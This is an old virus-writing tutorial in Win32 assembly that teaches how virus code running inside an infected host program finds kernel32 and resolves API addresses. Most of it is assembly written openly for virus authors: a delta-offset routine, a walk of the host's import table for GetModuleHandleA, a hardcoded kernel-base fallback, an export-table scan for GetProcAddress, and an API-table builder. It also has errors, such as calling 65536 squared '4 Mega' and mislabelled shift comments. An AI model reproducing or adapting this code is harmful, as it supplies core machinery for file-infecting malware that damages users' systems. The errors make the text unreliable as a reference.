        Before  starting  to  see  some  real  virus  writing  code,  let  us
 concentrate on  the most important issue of the win32 virus coding: locating
 the  win32 apis. As the Win32 apis are the heart of the system and no action
 can  be  performed  without them, one should locate the needed apis for it's
 code to run.

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ Basics

        Firstly,  let  me  say  that in this tute I will call all versions of
 Windows 95 (Chicago, Nashville, OSR1, OSR2, all betas), Windows 98 (Memphis,
 all betas) and Windows NT (3.x, 4.0) as w95. I know that Windows NT is quite
 different  from  Windows  95,  but  still  many things work on both systems.
 Therefore I will call all w95... After all, I write this stuff !!!! ;-))

        First  let  me  tell you about the memory in w95. Here, the memory is
 flat.  A  flat  memory  is  a  chunk  of bytes in a sole huge segment. It is
 called  a  selector.  Therefore,  you  don't need to use the old segment and
 offset  assignment  to  reach  a  particular area in the memory. Now all you
 have is the offset. The size of the memory is:

       65536 ^ 2 = 4,294,967,295 bytes (e.g. 4 Mega !!)

       Quite plenty !

       A refference into the memory can be done in all the known ways:

              [ESI]
              [ESI+EBX]
              [ESI+EBX+const]
              [EBX*8+ESI+const], etc.

        Anyway,  as  you noticed we work in a 32 bit environment, which means
 that  memory  addresses are 32 bit (00000000h - FFFFFFFFh). However, you can
 still easily read words or bytes:

              mov ax, word ptr [esi]
              mov al, byte ptr [esi]

        Ok,  now  you  have an idea on the memory layout. The simplest it can
 be. Now let's look at the main structures:

                     1. modules
                     2. functions


<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ Modules & Functions

        Now,  what  I  am  about to say is really, really easy to understand.
 While under w95, the memory layout is like this:

       00000000h - 3FFFFFFFh - Application code and data
       40000000h - 7FFFFFFFh - Shared memory (system DLL's)
       80000000h - BFFFFFFFh - OS Kernel
       C0000000h - FFFFFFFFh - Device Drivers

        I  have  to  note that the last 2 gigs are separated in Os Kernel and
 Device  Drivers  only  under  WindowsNT.  Windows 95/98 does not distinguish
 between Os kernel and device drivers.

        A  module  is a piece of code+data+resources+other misc stuff that is
 loaded  into memory. The offset that the module is loaded from is called the
 image  base.  The  module  is  loaded  into memory from the image base until
 imagebase + module size.

        The  Kernel32.DLL is a module. Upon loading the system, w95 loads the
 kernel  to a certain base in memory. For Windows 95/98 this address seems to
 be  fixed  for  now,  while for NT it isn't. The module base for the Windows
 95/98  kernel  can be found at address 0BFF70000h, for the existing versions
 of Windows 95/98, but Microsoft may choose to change this at any moment.

        The main important thing to know about a module are it's exported and
 imported functions. Here are the basic rules:

              ˘ a module may export functions
              ˘ a module may import functions
              ˘ a module could virtualy run with no imported or
                exported functions

        I  want  you  to  understand  that  when  I say that a module exports
 functions,  it doesn't mean that it is somewhere in the memory and it's just
 stuck  in  the  necks'  of  all  loading  programs.  The module exports it's
 functions  only to other modules that request it. And, the other way around,
 a  module  imports  functions  only from whatever other modules it may want.
 Let's check a diagram for a general module called M:

 €    where:  ƒƒƒƒƒƒ  represents functions imported by M                    €

        So,  M1,  M2,  M3  and M4 export functions to M, while M5, M6, M7, M8
 import  functions from M. Each module may import different functions from M.
 In  the mean time, we may have other modules that have nothing to do with M,
 like  M9  and  M10.  The  links between all the modules that are loaded at a
 certain time into memory sometimes may be very complex.

        However,  a  certain  set of functions is gathered into one module by
 their type. The most used modules in w95 are:

       Kernel32 - the base of the entire operating system
       User32   - useful functions for the user
       Gdi32    - Graphical interface


<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ Starting to code

        Before  starting  to  code,  I will have to warn you that you must be
 aware  of the things inside the PE header. If you don't, stop here and check
 a layout of the PE header, or use a PEdump utility to help you understand.

       Ok, before coding, here are the tools I use:

              TASM32 v.4.01
              TLINK32 v.7.0
              PWERSEC utility

       The tipical Win32 ASM application looks like this:

       .386p
       .387
       .model flat, stdcall
       locals
       jumps

       extrn <external name 1>:PROC
       extrn <external name 2>:PROC
       ...

       .data

       <never put real data here !>

       .code

       start:
              <main code>

       end start
       end

        This  is  the layout for a do_nothing win32 program. The program must
 be compiled like this:

       TASM32 /m3 /ml <progname.asm>
       TLINK32 /Tpe /aa /c <progname.asm>,<progname.exe>,,import32.lib

        So,  firstly,  you  MUST  have  the  import32.lib  file  in  the same
 directory  with  TASM, and secondly, when you code, you code CASE SENSITIVE.
 This is very important !! This means:

       GetCurrentDrive <> GETCURRENTDRIVE <> GeTcUrReNtDrIvE !!!!

        Well,  what  you  saw in the above code there marked with 'extrn' are
 actually  the  function  names of the functions your application will import
 after  the  linking.  Your application must import at least one function and
 that function is ExitProcess:

       extrn ExitProcess:PROC;

       ...

       Push 0                             ; exit to OS
       Call ExitProcess                   ;

        I  guess you understood already how to call an imported function. The
 only  thing  to  do is push on the stack the right parameters (which you can
 only  know  from  a  good  documentation)  and  then  call  it.  In the real
 diassembly, the above call is assembled like this:

       call xxxxxxxx
       ...
xxxxxxxx:
       jmp [yyyyyyyy] ; --> a jump to the real address of the function

        Now  that we know how to import functions, what a module is and how a
 function is called let's go deeper...

        The  thing is, there you are... inside the code, somewhere at the end
 of  the victim file and you are startingto execute code. But, as I explained
 later  you  cannot use other thingies under Win32 to obtain information, use
 it or set it, aside from the Windows functions, which I shall call Apis from
 now on. And there is your code neeeeding to execute Apis, all kinds of Apis,
 but restricted by the fact that the infected victim only imports a couple of
 them.  And the question comes: how can your code locate the addresses of the
 functions  it needs in order to be ableto call them directly. Here comes the
 really interesting part of this article.

        Just  as  a  short sidenote, in all the code that will follow, I will
 assume that your virus contains a beginning part that looks like this:

       Call GetDeltaHandle
GetDeltaHandle:
       Pop Ebp
       Sub Ebp, offset GetDeltaHandle

        Actually  I  don't care how you retrieve the delta handle, but I will
 consider that it's held by the EBP register. Just adjust your code.

        Ok,  so  the infected program starts. The loader takes it and puts it
 up  at it's own image base. The starting entry point is the beginning of the
 virus.  After  getting  the  Delta  Handle  into  EBP start checking for the
 environment  we find ourself in. Before going into that let me tell you that
 you'd  better  have  a  written  paper  with the PE Header layout so you can
 understand what offsets I use and why. I'll try to explain...


       mov esi, imagebase                ; get image base
       cmp word ptr [esi], 'ZM'          ; check if we have an EXE file
       jne getout                        ;

        For a normal Tlinked file, the initial imagebase is always 00400000h,
 so  this  value  will  be used initialy. But, when the virus infects another
 file,  the  mov  esi, imagebase instruction must be patched with the correct
 imagebase  for  that  specific  file.  (for  ex.  excel.exe  has  imagebase=
 30000000h). Let's continue:

       add esi, 3ch                      ; point to new header address
       mov esi, [esi]                    ; get it
       add esi, imagebase                ; always aling in memory...
       cmp word ptr [esi], 'EP'          ; is PE there ?
       jne getout                        ;
       add esi, 80h                      ; get import directory address

        Now,  the  register  ESI  points  to the import directory. The import
 directory  is  a big table that contains the names of the imported functions
 and  the  names  of  the  modules that exports them. So, I guess you already
 understood  that  we are about to search in the victims import directory the
 name of the Kernel32.dll file so we can locate it's functions.

       mov eax, [esi]                    ; Get the virtual address of the
       mov [ebp+importvirtual], eax      ; import dir and save it
       mov eax, [esi+4]                  ;
       mov [ebp+importsize], eax         ; also get the size of it
       mov esi, [ebp+importvirtual]      ;
       add esi, imagebase                ; align with imagebase
       mov ebx, esi                      ;
       mov edx, esi                      ; ESI: where from to search...
       add edx, [ebp+importsize]         ; EDX: the limit

        The  good thing is that the name of the module that exports functions
 is not coded in any way. So, it's only a matter of locating a string:

searchkernel:                            ;
       mov esi, [esi+0ch]                ; get an entry
       add esi, imagebase                ; align
       cmp [esi], 'NREK'                 ; is it KERNEL32 ?
       je foundit                        ;
       add ebx, 14h                      ; nope... get next entry
       mov esi, ebx                      ;
       cmp esi, edx                      ; did we go over limit ?
       jg notfound                       ;

        If  we  went  over the limit and the Kernel32 was not found, it means
 that  the  victim  does not import any functions from the k32, which is very
 less likely... Anyway, if it happens, you'll see what to do...
        But  if we found it, we are starting to locate the functions that the
 victim  imported  from  the  Kernel32.dll  module.  And  our  goal is a very
 important  function: GetModuleHandleA. This function allows us to locate the
 kernel32  in  memory  only  by pushing the offset of it's name... Let's look
 for  the  string  "GetModuleHandleA"  inside the kernel32's import table. We
 assume these declarations:

              gha db "GetModuleHandleA",0
              gha_size db $ - gha


foundit:                                 ; Here we found the Kernel !
       mov esi, ebx                      ;
       mov ebx, [esi+10h]                ; let's get the First Thunk there
       add ebx, imagebase                ;
       mov [ebp+offset firstthunk], ebx  ;
       mov eax, [esi]                    ;
       jz notfound                       ; if 0 -> bad...
                                         ;
searchgha:                               ;
       mov esi, [esi]                    ; let's search GetModuleHandle...
       add esi, imagebase                ;
       mov edx, esi                      ;
       mov ecx, [ebp+offset importsize]  ;
       mov eax, 0                        ;
                                         ;
lookloop:                                ;
      cmp dword ptr [edx], 0             ; the end ?
      je notfound                        ;
      cmp byte ptr [edx+3], 80h          ; ordinal ?
      je nothere                         ;
      mov esi, [edx]                     ;
      push ecx                           ;
      add esi, imagebase                 ;
      add esi, 2                         ;
      mov edi, offset gha                ;
      add edi, ebp                       ;
      mov ecx, gha_size                  ;
      rep cmpsb                          ; compare strings...
      pop ecx                            ;
      je  foundgha                       ; if equal, we found it !
                                         ;
nothere:                                 ;
      inc eax                            ; get next, otherwise...
      add edx, 4                         ;
      loop lookloop                      ;

        If  we  reached  here  it means that it really happened! The victim's
 import  table  came up with the GetModuleHandleA. It is a number in EAX that
 we need to multiply by 2 and add to the first thunk:

foundgha:                                ; Got it !!
      shl eax, 2                         ; multiply by 2
      mov ebx, [ebp+offset firstthunk]   ;
      add eax, ebx                       ; and add to first thunk
      mov eax, [eax]                     ; get the address there

        Now EAX holds the address of the GetModuleHandleA!! How can we use it
 in order to retrieve the Kernel32 address? Look:

      mov edx, offset k32                ; k32 db "KERNEL32.dll",0
      add edx, ebp                       ;
      push edx                           ; push the Kernel32 name
      call eax                           ; and get it's address
      cmp eax, 0                         ; is it a fail ?
      jne found                          ;

        If  the  operation failed, we find ourself in the same place where we
 would   be   if  the  victim  did  not  import  k32  functions,  or  if  the
 GetModuleHandleA was not among the imported ones:

notfound:                                ;
      mov eax, 0BFF70000h                ; if fail, assume hardcoded kernel

        This  is  the  default kernel32 address. If we are here, big problems
 occured...  As  long  as  we  assumed a hardcoded value for the Kernel32, we
 MUST check if it's ok, otherwise we might crash the system.

        Anyway,  after going thru all the mess, we arrived here, with a value
 in  the  eax  register which normally should point to the Kernel32 module in
 memory (it's base). Let's see what we do with it:

found:                                   ;
      mov [ebp+offset kernel32], eax     ; save the Kernel address
      mov edi, eax                       ; check if it's really the k32 there
      cmp word ptr [edi], 'ZM'           ; magic word...
      jne getout                         ;
                                         ;
      mov edi, [edi+3ch]                 ; look for...
      add edi, [ebp+offset kernel32]     ;
      cmp word ptr [edi], 'EP'           ; ...Portable Exe signature
      jne getout                         ;

        If  we are here then everything is OK! The kernel32 holds the correct
 module  base  address and we are about to use it heavily! Now, our next goal
 is another very important function called GetProcAddress. As it's name tells
 us,  this  function is used to retrieve other functions' addresses. As weare
 searching  withinthe  heart  ofthe  kernel  itself, I guess you already know
 whatwe  are  about  to do... We are about to check the Kernel32 export table
 and  look  for the GetProcAddress function. Again, I have to ask you to look
 overthe  PE  layout  to  understand  the following. But before, I wantyou to
 understand   that  all  values  we  retrieve  are  RVA's  (Relative  Virtual
 Addresses).  In  order  to  use  them,  we  must  turn  them to VA's. If the
 address  is  relative  to something, adding that something to it will remove
 the  relativity.  In  our  case  it's the base of the kernel32 module we are
 relative  to.  This  means that every address must be adjusted by adding the
 k32 base address to it. Let's rock:

      pushad                             ; save all regs !
      mov esi, [edi+78H]                 ; 78H = address for the export dir
      add esi, [ebp+offset kernel32]     ; normalize
      mov [ebp+offset export], esi       ; save it
      add esi, 10H                       ; look for Base Functions
      lodsd                              ; get Base of Exported Functions
      mov [ebp+offset basef], eax        ; save base of the functions
      lodsd                              ; get Number of Exported Functions
      lodsd                              ; get Number of Exported Names
      mov [ebp+offset limit], eax        ; save the number of names/funcs
      add eax, [ebp+offset kernel32]     ;
      lodsd                              ; Get Address of Exported Functions
      add eax, [ebp+offset kernel32]     ;
      mov [ebp+offset AddFunc],eax       ; save address of functions
      lodsd                              ; Get Address of Exported Names
      add eax, [ebp+offset kernel32]     ;
      mov [ebp+offset AddName], eax      ; save Address of Exported Names
      lodsd                              ; Get Address of Exported Ordinals
      add eax, [ebp+offset kernel32]     ;
      mov [ebp+offset AddOrd], eax       ; save Address of Ordinals
      mov esi,[ebp+offset AddFunc]       ;
      lodsd                              ;
      add eax, [ebp+offset kernel32]     ;

      Now, we retrieved the most signifiant things from the export table:

              ˘ The number of exported functions (equal  to  the  number  of
                exported names)
              ˘ The Address of functions
              ˘ The Address of names (where we shall scan)
              ˘ The Address of ordinals

      The  address  of  names  points to a table of function name strings one
 after  another.  The  address  of  functions  points  to a table filled with
 function  addresses.  And  the address of ordinals point to a table with the
 ordinal number or each function. So, one function's proprieties are:

                ˘ the name
                ˘ the address
                ˘ the ordinal


        So,  let's  start  looking  for  "GetProcAddress". I will assume this
 definition:

      First_API             db "GetProcAddress",0   ; the name
      AGetProcAddress       dd 0                    ; the address

      No more games! Let's scan:

      mov esi, [ebp+offset AddName]      ; get the first pointer to a name
      mov [ebp+offset Nindex], esi       ; save the index into the name array
      mov edi, [esi]                     ; normalize with kernel32
      add edi, [ebp+offset kernel32]     ;
      mov ecx, 0                         ; sets the counter to 0
      mov ebx, offset First_API          ; Set starting address
      add ebx, ebp                       ;
                                         ;
TryAgain:                                ;
      mov esi, ebx                       ; ESI points to the name we search
                                         ;
MatchByte:                               ;
      cmpsb                              ; do we have a byte match ?
      jne NextOne                        ; no! Try next name of function
                                         ;
      cmp byte ptr [edi], 0              ; did the entire string match ?
      je GotIt                           ; YES !
      jmp MatchByte                      ; nope... try next byte
                                         ;
NextOne:                                 ;
     inc cx                              ; increment counter
     cmp cx, word ptr [ebp+offset limit] ; check limit override
     jge getout                          ; (the limit is the max. no. of f.)
                                         ;
     add dword ptr [ebp+offset Nindex], 4; get the next pointer rva
     mov esi, [ebp+offset Nindex]        ; and try again
     mov edi, [esi]                      ;
     add edi, [ebp+offset kernel32]      ;
     jmp TryAgain                        ;

        If  we  found  the GetProcAddress string in the table, the code jumps
 here with the following parameter:

       cx = the index into the Address of Ordinals

       Having CX we have the following formulas:

      CX * 2 + [Address of Ordinals] = Ordinal
      Ordinal * 4 + [Address of Functions] = Address of Function (RVA)

      Let us apply the final formulas:

GotIt:
      mov ebx, esi                      ; get set for next search routine
      inc ebx                           ;
      shl ecx, 1                        ; ECX = ECX * 2
      mov esi, [ebp+offset AddOrd]      ;
      add esi, ecx                      ; add Address of Ordinals
      xor eax, eax                      ;
      mov ax, word ptr [esi]            ; Retrieve Ordinal
      shl eax, 2                        ; Ordinal = Ordinal * 4
      mov esi, [ebp+offset AddFunc]     ;
      add esi, eax                      ; Add Address of Functions
      mov edi, dword ptr [esi]          ; take the RVA there
      add edi, [ebp+offset kernel32]    ; add kernel32 module base

      Here, EDI holds the real address of the GetProcAddress function !

      mov [ebp+offset AGetProcAddressA], edi  ; we save it
      popad                                   ; restore registers we saved

        Now,  if  we  have  the  GetProcAddress's  address,  we  are virtualy
 unstopable !! Let's look at how I define the search for addresses table:

      AExitProcess        db "ExitProcess",0       ; the names
      AFindFirstFile      db "FindFirstFileA",0
      ACreateFile         db "CreateFileA",0
      ...
                          db 0FFh

      AExitProcessA       dd 0                     ; and the place to put
      AFindFirstFileA     dd 0                     ; the addresses
      ACreateFileA        dd 0
      ...


      mov esi, offset AExitProcess      ; and start retrieving all the apis
      mov edi, offset AExitProcessA     ; we need !
      add esi, ebp                      ;
      add edi, ebp                      ;

      The calling of the GetProcAddress is done like this:

                     push offset <function name>
                     push module_base
                     call GetProcAddress

        The return is the address of the <function name> function, or 0 if it
 was  a  fail.  A  fail  may be caused by various things like: misstyping the
 name  of  the function (it's case sensitive!!), the function is not exported
 by that module, the module base is wrong, etc...

        So,  basically  we  will make a loop which will use the above call to
 retrieve the addresses for every function in our list.

Repeat_find_apis:                       ;
      push esi                          ; find an API
      mov eax, [ebp+offset kernel32]    ;
      push eax                          ;
      mov eax, [ebp+offset AGetProcAddressA]
      call eax                          ; get it !!
      cmp eax, 0                        ; check if an API find failed
      je getout                         ;
      stosd                             ; store it's address
                                        ;
repeat_inc:                             ;
      inc esi                           ; go to the next API name
      cmp byte ptr [esi], 0             ;
      jne repeat_inc                    ;
      inc esi                           ;
      cmp byte ptr [esi], 0FFh          ; and check for the end
      jne Repeat_find_apis              ;


      If the code reaches here, then our goal is achieved:

              ˘ we searched and found the kernel
              ˘ we searched and found the addresses for all the apis our
                virus needs

        Now,  in  order  to call a function, we use the address we retrieved,
 like this:

              push <function arguments needed>
              mov eax, [ebp + AFindFirstFileA]
              Call eax

       This is an example of calling the FindFirstFileA.

        Another smooth way to use GetProcAddress in your virus is to create a
 procedure like this:

       Call_API proc
                pop dword ptr [ebp+retaddress]     ; take return addr off...
                push eax                           ; push function name
                push kernel32                      ; push kernel base
                mov eax, [ebp + AGetProcAddress]   ; call GetProcAddress
                Call eax                           ; call the function !
                push dword ptr [ebp+retaddress]    ; restore return address
                ret
       retaddr  dd 0
      Call_API endp

      In order then to call certain function you do this:

                     push <function parameters>
                     mov eax, offset <function name>
                     call Call_API

        In this easy way, you don't have to make a loop to retrieve all Api's
 addresses,  but  instead  everytime  you  need  to  call an Api the Call_API
 procedure  will  get  it's  address and will call it directly. It works more
 like a macro...


                        APPENDIX
                       ƒÕÕÕÕÕÕÕÕƒ

        I  feel  like  I left quite a few things unsaid and unexplained up in
 the article, so let me try to fill all the gaps in this appendix.

        As  you  noticed,  many functions among which GetModuleHandle is also
 around,  have  a suplemental character at the end, e.g. "A" or "W". The last
 letter  reffers  to  the  type  of  parameter  the function awaits for. Some
 functions accept only the macro type:

                    SetWindowText(...)

      Ansi type:
                    SetWindowTextA(...)

      Wide type:
                    SetWindowTextW(...)

        In   our   example   above   we   scanned   the   infected  host  for
 GetModuleHandleA.   However   some  files  my  import  the  GetModuleHandleW
 functions.  To make a more reliable scanner one should scan for both styles,
 first Ansi and then Wide.

        Ok,  now  let  me  make  a little graphic that should explain how all
 things are tied together and which is the track we go on hunting:

        I guess this is comprehesive enough.

        As   a   sidenote,  I  should  say  that  the  if  you  do  not  find
 GetModuleHandle(A/W)  in  the  Import  Table  of  the  victim, but still the
 hardcoded  value  for  the Kernel32 is correct, you should also get the real
 address  of  the  GetModuleHandleA  using  GetProcAddress.  You can then use
 GetModuleHandleA  to  retrieve  addresses for other modules, like USER32, if
 you want to display a MessageBox, for example.
